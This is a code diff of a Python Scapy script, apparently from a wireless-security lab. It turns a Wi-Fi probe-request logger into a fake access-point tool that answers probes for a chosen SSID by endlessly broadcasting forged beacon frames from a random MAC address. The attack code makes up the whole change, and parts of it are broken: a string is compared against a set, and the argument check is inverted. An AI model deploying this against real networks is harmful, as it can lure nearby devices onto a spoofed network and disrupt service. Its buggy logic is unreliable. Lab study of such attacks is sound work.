@@ -15,28 +15,34 @@
 #
 #-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
+import sys
 from scapy.all import *
 
 interface = "wlan0mon"
 
-clientProbes = set()
- 
+ap_SSID = set()
+
 # fonction appelée pour chaque paquet sniffé
 def packetHandler(pkt):
 
     if pkt.haslayer(Dot11ProbeReq):
         #print(pkt.addr2 + "---" + pkt.info.decode("utf-8"))
-        if len(pkt.info) > 0 :
-            probe = pkt.addr2 + "-" + pkt.info.decode("utf-8")
-            #print(probe)
-            if probe not in clientProbes :
-                clientProbes.add(probe)
-                print ("New Probe Found : " + pkt.addr2 + ' ' + pkt.info.decode("utf-8"))
+        if len(pkt.info) > 0  and pkt.info.decode() == ap_SSID:
+            fakeApCreator()
                 
  
 
+def fakeApCreator():
+    mac_AP = str(RandMAC())
+    fake_AP_packet = RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=mac_AP, addr3=mac_AP) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=ap_SSID)
+
+    while True:
+        sendp(fake_AP_packet, iface=interface)
 
 
-# On sniffe en passant en fonction de callback la fonction sniffing
-sniff(count=400, iface=interface, prn=packetHandler)
-    
+if (len(sys.argv) != 2):
+
+    ap_SSID = sys.argv[1]
+    # On sniffe en passant en fonction de callback la fonction sniffing
+    a = sniff(iface=interface, prn=packetHandler)
+
